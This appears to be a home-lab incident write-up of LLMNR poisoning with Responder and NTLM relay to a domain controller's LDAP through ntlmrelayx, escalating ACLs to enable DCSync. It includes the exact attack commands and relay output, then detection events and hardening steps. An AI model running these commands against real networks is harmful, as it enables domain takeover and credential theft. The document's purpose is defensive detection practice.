# INC-001 — LLMNR Poisoning + NTLM Relay to LDAP ACL Escalation

| Field | Value |
|-------|-------|
| **ID** | INC-001 |
| **Date** | 2026-09-03 |
| **MITRE ATT&CK** | T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning |
| **Severity** | High |
| **Status** | ✅ Complete |
| **Attacker** | Kali (172.16.0.11) |
| **Victim** | Win10 (172.16.0.10) |
| **Target** | DC (172.16.0.5) — `soc.lab` domain |

---

## Summary

An attacker on the LAN ran Responder to poison LLMNR/MDNS name resolution broadcasts. When the Win10 victim attempted to resolve a non-existent hostname (`FAKESERVER`), Responder intercepted the request and responded with a poisoned answer, causing Win10 to send HTTP NTLM authentication directly to the attacker. ntlmrelayx then relayed that credential in real time to the Domain Controller’s LDAP service, authenticated as `SOC\Administrator`, and escalated privileges by writing `Replication-Get-Changes-All` rights on the domain object — making the domain fully vulnerable to a DCSync attack.

Detection fired on the DC via two EID 4662 events (WRITE_DAC + Write Property on the domain object) captured in Winlogbeat and confirmed in Kibana.

---

## Attack Chain

```
[Kali 172.16.0.11]                    [Win10 172.16.0.10]             [DC 172.16.0.5]
       |
       |-- Responder (LLMNR/MDNS poison) -->
                                             |
                               resolves FAKESERVER
                               broadcasts LLMNR query
                                             |
       <-- Responder poisons response -------|
                                             |
                               Win10 sends HTTP NTLM auth
                                             |
       <-- NTLMv2 credential intercepted ----|
       |
       |-- ntlmrelayx relays credential --------------------------------->
                                                                          |
                                                                 LDAP auth: SUCCEED
                                                                          |
                                                          Writes ACL: Replication-Get-Changes-All
                                                                          |
                                                             EID 4662 x2 fired on DC
```

---

## Environment

| Host | IP | Role |
|------|----|------|
| Kali | 172.16.0.11 | Attacker — Responder 3.2.2.0 + ntlmrelayx |
| Win10 | 172.16.0.10 | Victim — LLMNR enabled, no GPO protection |
| DC | 172.16.0.5 | Target — LDAP signing: Negotiate (relayable) |

**Why the relay worked:**
- LLMNR/NBT-NS enabled on Win10 (no GPO to disable it)
- DC LDAP signing set to `Negotiate` (not `Required`) — relay accepted
- SMB signing required on DC — SMB relay blocked, LDAP relay succeeded

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Responder | 3.2.2.0 | LLMNR/MDNS/NBT-NS poisoning + credential capture |
| ntlmrelayx | Impacket | Relay NTLMv2 to LDAP, escalate ACL |
| nmap | — | SMB signing check pre-attack |
| sigma-cli | 3.1.0 | Sigma rule conversion to Lucene |

---

## Attack Execution

### 1. Pre-attack recon — SMB signing check

```bash
nmap --script smb-security-mode -p 445 172.16.0.5 172.16.0.10
```

- DC (172.16.0.5): SMB signing **required** → SMB relay blocked
- Win10 (172.16.0.10): SMB signing **not required** → SMB relay possible but unnecessary

### 2. Configure Responder — SMB off, HTTP on

```bash
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = Off/HTTP = On/' /etc/responder/Responder.conf
```

Reason: ntlmrelayx needs port 80 — Responder must not compete.

### 3. Start ntlmrelayx — LDAP relay to DC

```bash
sudo impacket-ntlmrelayx \
  -t ldap://172.16.0.5 \
  --no-smb-server \
  --escalate-user Administrator \
  -wh attacker-wpad
```

### 4. Start Responder — LLMNR/MDNS poisoning

```bash
sudo responder -I eth0 -wv
```

### 5. Trigger on victim (Win10)

Browsed to `http://FAKESERVER/` in browser — Win10 broadcast LLMNR query, Responder poisoned it, Win10 sent HTTP NTLM auth to Kali.

### 6. Relay result

```
[*] Authenticating against ldap://172.16.0.5 as SOC/ADMINISTRATOR SUCCEED
[*] Enumerating relayed user's privileges
[*] Attempting to escalate Administrator
[*] DC: 172.16.0.5 No more targets left!
[*] Writing ACL
[*] Done!
```

`SOC\Administrator` now has `Replication-Get-Changes-All` — domain fully compromised.

---

## Detection

See [`detection.md`](./detection.md) for the full Sigma rule, KQL query, and validation details.

### Events Observed

| Record | EID | Access | AccessMask | Timestamp (UTC) |
|--------|-----|--------|------------|----------------|
| 71400 | 4662 | WRITE_DAC | 0x40000 | 11:31:12.039Z |
| 71402 | 4662 | Write Property | 0x20 | 11:31:12.079Z |

Index: `winlogbeat-2026.09.03` — host: `SOC-Lab-DC.soc.lab`

### Kibana Detection Rule

**NTLM Relay — Suspicious AD Object ACL Write (T1557.001)**
- Severity: High | Risk: 73
- Query: Lucene against `winlogbeat-*`
- Result: 2 alerts fired ✅

---

## Evidence

| File | Description |
|------|-------------|
| `evidence/kibana-4662-ldap-relay-acl-write.png` | Kibana Discover — both EID 4662 events visible |

---

## Remediation

See [`remediation.md`](./remediation.md) for full hardening steps.

**Quick fixes:**
1. **Disable LLMNR** via GPO — `Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled`
2. **Disable NBT-NS** — NIC properties → Advanced TCP/IP → Disable NetBIOS over TCP/IP
3. **Set LDAP signing to Required** on DC — `Domain Controller: LDAP server signing requirements → Require signing`
4. **Enable SMB signing** on all hosts — prevents SMB relay variant
5. **Audit AD ACL changes** — alert on EID 4662 ObjectServer:DS outside maintenance windows
